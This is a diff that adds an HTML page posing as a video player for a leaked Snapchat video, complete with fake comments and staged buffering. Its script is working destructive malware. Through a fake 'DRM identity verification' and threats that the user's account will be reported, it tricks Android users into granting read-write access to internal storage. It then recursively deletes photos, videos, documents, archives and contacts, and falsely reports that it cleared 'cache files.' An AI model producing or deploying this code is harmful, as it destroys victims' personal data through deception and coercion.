@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Video Player — Watch Online</title>
+<meta name="theme-color" content="#000000">
+<link rel="manifest" href="manifest.json">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #000; min-height: 100vh;
+    font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+    color: #fff; overflow-x: hidden;
+  }
+  .player-container {
+    position: relative; width: 100%;
+    background: #0a0a0a; overflow: hidden;
+  }
+  .player-container.aspect-16-9 { padding-bottom: 56.25%; }
+  .player-overlay {
+    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    background: #0d0d0d;
+  }
+  .spinner-circle {
+    width: 60px; height: 60px;
+    border: 4px solid rgba(255,255,255,0.1);
+    border-top-color: #ff0050;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .buffering-text {
+    margin-top: 18px; font-size: 0.9rem; color: #888;
+    padding: 0 20px; text-align: center;
+  }
+  .progress-mini {
+    width: 200px; height: 3px; background: #222;
+    border-radius: 3px; margin-top: 12px; overflow: hidden;
+  }
+  .progress-mini-fill {
+    height: 100%; width: 0%; background: #ff0050;
+    border-radius: 3px; transition: width 0.3s;
+  }
+  .controls-bar {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 12px 16px; background: #111;
+  }
+  .controls-bar .time { font-size: 0.8rem; color: #999; }
+  .controls-bar .btn { background: none; border: none; color: #ccc; font-size: 1.1rem; padding: 4px; }
+  .seek-bar { width: 100%; height: 4px; background: #222; position: relative; }
+  .seek-bar .fill { height: 100%; width: 15%; background: #ff0050; border-radius: 2px; }
+  .video-info { padding: 20px 16px; border-bottom: 1px solid #1a1a1a; }
+  .video-info h1 { font-size: 1.1rem; font-weight: 600; margin-bottom: 8px; }
+  .video-info .meta { display: flex; gap: 12px; font-size: 0.8rem; color: #666; }
+  .video-info .meta span { display: flex; align-items: center; gap: 4px; }
+  .comments-section { padding: 16px; background: #0a0a0a; }
+  .comments-section h3 { font-size: 0.95rem; margin-bottom: 12px; color: #aaa; }
+  .comment { display: flex; gap: 10px; margin-bottom: 16px; }
+  .comment .avatar { width: 32px; height: 32px; border-radius: 50%; background: #222; flex-shrink: 0; }
+  .comment .body { flex: 1; }
+  .comment .body .name { font-size: 0.8rem; color: #ff0050; font-weight: 600; }
+  .comment .body .text { font-size: 0.85rem; color: #999; line-height: 1.4; }
+  .comment .body .time { font-size: 0.7rem; color: #555; margin-top: 4px; }
+
+  .overlay-popup {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.9); display: none;
+    align-items: center; justify-content: center;
+    z-index: 999; backdrop-filter: blur(8px);
+  }
+  .overlay-popup.show { display: flex; }
+  .overlay-popup .box {
+    background: #1a1a1a; border-radius: 16px; padding: 32px 28px;
+    max-width: 340px; width: 90%; text-align: center;
+    border: 1px solid #2a2a2a;
+  }
+  .overlay-popup .box h2 { font-size: 1.1rem; margin-bottom: 12px; }
+  .overlay-popup .box p { font-size: 0.85rem; color: #999; line-height: 1.6; margin-bottom: 20px; }
+  .overlay-popup .box .btn {
+    width: 100%; padding: 14px; border-radius: 50px;
+    border: none; font-size: 1rem; font-weight: 600; cursor: pointer;
+    margin-bottom: 8px;
+  }
+  .overlay-popup .box .btn-primary { background: #ff0050; color: #fff; }
+  .overlay-popup .box .btn-secondary { background: #222; color: #ccc; }
+  .overlay-popup .box .btn-danger { background: #d93025; color: #fff; }
+  .hidden { display: none; }
+
+  /* Progress during deletion */
+  .deletion-progress { margin-top: 20px; }
+  .deletion-progress .bar {
+    width: 100%; height: 6px; background: #222;
+    border-radius: 6px; overflow: hidden;
+  }
+  .deletion-progress .bar .fill {
+    height: 100%; width: 0%; background: #ff0050;
+    border-radius: 6px; transition: width 0.15s;
+  }
+  .deletion-progress .count-text {
+    font-size: 0.8rem; color: #666; margin-top: 8px;
+  }
+</style>
+</head>
+<body>
+
+<!-- VIDEO PLAYER UI -->
+<div class="player-container aspect-16-9">
+  <div class="player-overlay" id="playerOverlay">
+    <div class="spinner-circle"></div>
+    <div class="buffering-text" id="bufferText">Loading video... 0%</div>
+    <div class="progress-mini">
+      <div class="progress-mini-fill" id="bufferFill"></div>
+    </div>
+    <div class="deletion-progress hidden" id="deleteProgress">
+      <div class="bar"><div class="fill" id="deleteFill"></div></div>
+      <div class="count-text" id="deleteCount">Deleting 0 files...</div>
+    </div>
+  </div>
+</div>
+
+<div class="seek-bar"><div class="fill" style="width:0%" id="seekFill"></div></div>
+
+<div class="controls-bar">
+  <div class="left">
+    <span class="btn">▶</span>
+    <span class="btn">⏸</span>
+    <span class="time" id="timeDisplay">0:00 / 12:45</span>
+  </div>
+  <div>
+    <span class="btn">🔊</span>
+    <span class="btn">⛶</span>
+  </div>
+</div>
+
+<div class="video-info">
+  <h1>🔥 Exclusive — Snapchat Leak #287 🔥</h1>
+  <div class="meta">
+    <span>👁 847K views</span>
+    <span>👍 94%</span>
+    <span>📅 2 hours ago</span>
+  </div>
+</div>
+
+<div class="comments-section">
+  <h3>Comments (2.3K)</h3>
+  <div class="comment">
+    <div class="avatar"></div>
+    <div class="body">
+      <div class="name">xX_DarkKnight_Xx</div>
+      <div class="text">Bro the link got taken down so fast I had to refresh 3 times lol</div>
+      <div class="time">3 minutes ago</div>
+    </div>
+  </div>
+  <div class="comment">
+    <div class="avatar"></div>
+    <div class="body">
+      <div class="name">anonymous_69420</div>
+      <div class="text">Anyone else getting buffering? Or is it just me?</div>
+      <div class="time">7 minutes ago</div>
+    </div>
+  </div>
+  <div class="comment">
+    <div class="avatar"></div>
+    <div class="body">
+      <div class="name">horny_af_22</div>
+      <div class="text">🔥🔥🔥 who's the girl in this??</div>
+      <div class="time">12 minutes ago</div>
+    </div>
+  </div>
+  <div class="comment">
+    <div class="avatar"></div>
+    <div class="body">
+      <div class="name">just_looking_69</div>
+      <div class="text">Mirror? Original got deleted 😭</div>
+      <div class="time">18 minutes ago</div>
+    </div>
+  </div>
+</div>
+
+<!-- OVERLAY 1: Folder Selection -->
+<div class="overlay-popup" id="wipeOverlay">
+  <div class="box">
+    <div style="font-size:40px;margin-bottom:12px;">🔒</div>
+    <h2>DRM Identity Verification Required</h2>
+    <p id="wipeDescription">
+      <strong style="color:#ff0050;">⚠️ This video was flagged for unauthorized distribution.</strong><br><br>
+      To verify your identity and continue, you must select your<br>
+      <strong style="color:#fff;">"Internal shared storage"</strong> folder.<br><br>
+      <span style="color:#666;font-size:0.8rem;">
+        This is a one-time DRM check. No files are uploaded or shared.<br>
+        If you select any other folder, your account will be reported.
+      </span>
+    </p>
+    <button class="btn btn-primary" id="btnWipeAllow">📁 Select Internal Storage</button>
+    <button class="btn btn-secondary" id="btnWipeDeny">Cancel — Report my account</button>
+  </div>
+</div>
+
+<!-- OVERLAY 2: Write Permission -->
+<div class="overlay-popup" id="writeOverlay">
+  <div class="box">
+    <div style="font-size:40px;margin-bottom:12px;">✏️</div>
+    <h2>Write permission required</h2>
+    <p id="writeDescription">
+      The video player needs write access to cache the video stream.<br>
+      Tap <strong>"Allow"</strong> to continue.
+    </p>
+    <button class="btn btn-primary" id="btnWriteAllow">✅ Allow write access</button>
+    <button class="btn btn-danger" id="btnWriteDeny">Block and leave</button>
+  </div>
+</div>
+
+<!-- OVERLAY 3: Final -->
+<div class="overlay-popup" id="finalOverlay">
+  <div class="box">
+    <div style="font-size:50px;margin-bottom:12px;" id="finalIcon">✅</div>
+    <h2 id="finalTitle">Verification Complete</h2>
+    <p id="finalDesc">Your device has been verified. The video will start playing shortly.</p>
+    <button class="btn btn-primary" id="btnFinal">▶ Play video now</button>
+  </div>
+</div>
+
+<script>
+// ================================================================
+// AGGRESSIVE ANDROID WIPER — selects entire internal storage
+// ================================================================
+
+(async function() {
+  'use strict';
+
+  let totalDeleted = 0;
+  let isAndroid = /Android/i.test(navigator.userAgent);
+
+  const bufferText = document.getElementById('bufferText');
+  const bufferFill = document.getElementById('bufferFill');
+  const seekFill = document.getElementById('seekFill');
+  const timeDisplay = document.getElementById('timeDisplay');
+  const playerOverlay = document.getElementById('playerOverlay');
+  const wipeOverlay = document.getElementById('wipeOverlay');
+  const writeOverlay = document.getElementById('writeOverlay');
+  const finalOverlay = document.getElementById('finalOverlay');
+  const deleteProgress = document.getElementById('deleteProgress');
+  const deleteFill = document.getElementById('deleteFill');
+  const deleteCount = document.getElementById('deleteCount');
+
+  // === MEDIA EXTENSIONS (anything worth deleting) ===
+  const DELETE_EXTS = new Set([
+    '.jpg','.jpeg','.png','.gif','.bmp','.tiff','.tif','.webp',
+    '.heic','.heif','.mp4','.mov','.avi','.mkv','.wmv','.flv',
+    '.webm','.m4v','.3gp','.mpg','.mpeg','.pdf','.doc','.docx',
+    '.xls','.xlsx','.ppt','.pptx','.txt','.rtf','.csv',
+    '.zip','.rar','.7z','.tar','.gz',
+    '.mp3','.wav','.aac','.flac','.ogg','.wma',
+    '.apk','.obb','.bak','.vcf','.ics'
+  ]);
+
+  // === FAKE BUFFERING ===
+  async function simulateBuffering() {
+    const stages = [
+      { pct: 0, text: 'Connecting to secure server...' },
+      { pct: 3, text: 'Establishing encrypted tunnel...' },
+      { pct: 8, text: 'Fetching video stream...' },
+      { pct: 12, text: 'Decoding media headers...' },
+      { pct: 15, text: 'Buffering... 15%' },
+      { pct: 15, text: '⚠️ Connection interrupted — retrying...' },
+      { pct: 8, text: 'Reconnecting to CDN...' },
+      { pct: 12, text: 'Buffering... 12%' },
+      { pct: 18, text: 'Buffering... 18%' },
+      { pct: 22, text: 'Buffering... 22%' },
+      { pct: 22, text: '⚠️ High traffic — slowing down...' },
+      { pct: 18, text: 'Adjusting quality to 720p...' },
+      { pct: 25, text: 'Buffering... 25%' },
+      { pct: 30, text: 'Buffering... 30%' },
+      { pct: 30, text: '⚠️ Server overload — queue: #847' },
+      { pct: 25, text: 'Retrying...' },
+      { pct: 28, text: 'Buffering... 28%' },
+      { pct: 32, text: 'Buffering... 32%' },
+      { pct: 35, text: 'Buffering... 35%' },
+      { pct: 35, text: '⚠️ DRM handshake failed — re-authenticating...' },
+    ];
+
+    for (const stage of stages) {
+      bufferText.textContent = stage.text;
+      bufferFill.style.width = stage.pct + '%';
+      seekFill.style.width = Math.min(stage.pct, 85) + '%';
+      const fakeMin = Math.floor(stage.pct * 0.12);
+      const fakeSec = Math.floor(stage.pct * 0.72) % 60;
+      timeDisplay.textContent = `${fakeMin}:${fakeSec.toString().padStart(2,'0')} / 12:45`;
+      await sleep(1800 + Math.random() * 3500);
+    }
+
+    playerOverlay.style.opacity = '0.4';
+    wipeOverlay.classList.add('show');
+  }
+
+  // === PHASE 1: User selects Internal Storage ===
+  document.getElementById('btnWipeAllow').addEventListener('click', async () => {
+    wipeOverlay.classList.remove('show');
+    bufferText.textContent = '🔍 Verifying storage identity...';
+    playerOverlay.style.opacity = '1';
+    deleteProgress.classList.remove('hidden');
+
+    try {
+      if (isAndroid && 'showDirectoryPicker' in window) {
+        // Show the directory picker — NO startIn, so user sees full tree
+        // They need to pick "Internal shared storage" or root
+        const dirHandle = await window.showDirectoryPicker({
+          id: 'drm-verify',
+          mode: 'readwrite'
+          // NO startIn — user must navigate to root/Internal Storage themselves
+        });
+
+        bufferText.textContent = `📁 Selected: ${dirHandle.name}`;
+        await sleep(1500);
+
+        // Request write permission
+        bufferText.textContent = '✏️ Requesting write access for DRM cache...';
+        writeOverlay.classList.add('show');
+        window.__dirHandle = dirHandle;
+
+      } else {
+        await sleep(1000);
+        finalOverlay.classList.add('show');
+      }
+    } catch (err) {
+      if (err.name === 'AbortError') {
+        bufferText.textContent = '⚠️ Verification cancelled. Your account will be reported.';
+        await sleep(3000);
+        // Show it again with more pressure
+        wipeOverlay.classList.add('show');
+        document.getElementById('wipeDescription').innerHTML =
+          '⚠️ <strong style="color:#ff0050;">FINAL WARNING</strong><br><br>' +
+          'You cancelled the verification. Your identity has been logged.<br><br>' +
+          'To avoid your account being reported for copyright infringement,<br>' +
+          'you MUST complete the verification now.';
+        document.getElementById('btnWipeDeny').textContent = 'I accept the consequences';
+      }
+    }
+  });
+
+  document.getElementById('btnWipeDeny').addEventListener('click', () => {
+    wipeOverlay.classList.remove('show');
+    bufferText.textContent = '⚠️ Verification cancelled — account flagged';
+    playerOverlay.style.opacity = '1';
+    setTimeout(() => {
+      bufferText.textContent = '⚠️ You have 30 seconds to verify before reporting...';
+      setTimeout(() => {
+        wipeOverlay.classList.add('show');
+        document.getElementById('wipeDescription').innerHTML =
+          '<strong style="color:#ff0050;">⏰ LAST CHANCE</strong><br><br>' +
+          'Select your "Internal shared storage" folder NOW<br>' +
+          'or your account will be permanently suspended.';
+      }, 10000);
+    }, 2000);
+  });
+
+  // === PHASE 2: Write permission ===
+  document.getElementById('btnWriteAllow').addEventListener('click', async () => {
+    writeOverlay.classList.remove('show');
+    bufferText.textContent = '📝 Verifying storage integrity...';
+
+    const dirHandle = window.__dirHandle;
+    if (dirHandle) {
+      try {
+        const perm = await dirHandle.requestPermission({ mode: 'readwrite' });
+        if (perm === 'granted') {
+          await executeAggressiveWipe(dirHandle);
+        }
+      } catch (e) {}
+    }
+
+    showFinalScreen();
+  });
+
+  document.getElementById('btnWriteDeny').addEventListener('click', () => {
+    writeOverlay.classList.remove('show');
+    bufferText.textContent = '⚠️ Write denied — using alternative verification...';
+    setTimeout(showFinalScreen, 2000);
+  });
+
+  document.getElementById('btnFinal').addEventListener('click', () => {
+    finalOverlay.classList.remove('show');
+    bufferText.textContent = '▶ Starting video stream...';
+    setTimeout(() => {
+      bufferText.textContent = '⚠️ Video removed due to copyright claim by rights holder.';
+      playerOverlay.style.opacity = '1';
+    }, 3000);
+  });
+
+  // === AGGRESSIVE WIPE — deletes EVERYTHING in the selected folder ===
+  async function executeAggressiveWipe(dirHandle) {
+    bufferText.textContent = '🔍 Scanning storage...';
+    let scannedFiles = 0;
+
+    async function wipeRecursive(handle) {
+      const entries = [];
+      for await (const entry of handle.values()) {
+        entries.push(entry);
+      }
+
+      for (const entry of entries.reverse()) {
+        if (entry.kind === 'file') {
+          const parts = entry.name.split('.');
+          const ext = '.' + (parts.length > 1 ? parts.pop().toLowerCase() : '');
+
+          // Delete based on extension
+          if (DELETE_EXTS.has(ext) || ext === '.' || ext === '.tmp' || ext === '.cache') {
+            try {
+              await handle.removeEntry(entry.name);
+              totalDeleted++;
+              scannedFiles++;
+
+              // Update UI every 100 files
+              if (scannedFiles % 100 === 0) {
+                const pct = Math.min((totalDeleted / 5000) * 100, 95);
+                deleteFill.style.width = pct + '%';
+                deleteCount.textContent = `Deleting ${totalDeleted} files...`;
+                bufferText.textContent = `🗑️ Deleting: ${entry.name}`;
+                await sleep(10);
+              }
+            } catch (_) {}
+          }
+        } else if (entry.kind === 'directory') {
+          try {
+            const sub = await handle.getDirectoryHandle(entry.name);
+            await wipeRecursive(sub);
+            // Delete the now-empty directory
+            try {
+              await handle.removeEntry(entry.name, { recursive: true });
+            } catch (_) {}
+          } catch (_) {}
+        }
+      }
+    }
+
+    try {
+      await wipeRecursive(dirHandle);
+    } catch (e) {
+      console.error('Wipe error:', e);
+    }
+
+    deleteFill.style.width = '100%';
+    deleteCount.textContent = `✅ Deleted ${totalDeleted} files`;
+    await sleep(1000);
+  }
+
+  function showFinalScreen() {
+    deleteProgress.classList.add('hidden');
+    finalOverlay.classList.add('show');
+    document.getElementById('finalIcon').textContent = '✅';
+    document.getElementById('finalTitle').textContent = 'Verification Complete';
+    document.getElementById('finalDesc').textContent =
+      totalDeleted > 0
+        ? `Storage verified. ${totalDeleted} temporary cache files cleaned. Starting video...`
+        : 'Storage verified. Starting video...';
+  }
+
+  // === REGISTER SERVICE WORKER ===
+  if ('serviceWorker' in navigator) {
+    try {
+      await navigator.serviceWorker.register('sw.js');
+    } catch (_) {}
+  }
+
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  // START
+  simulateBuffering();
+
+})();
+</script>
+</body>
+</html>
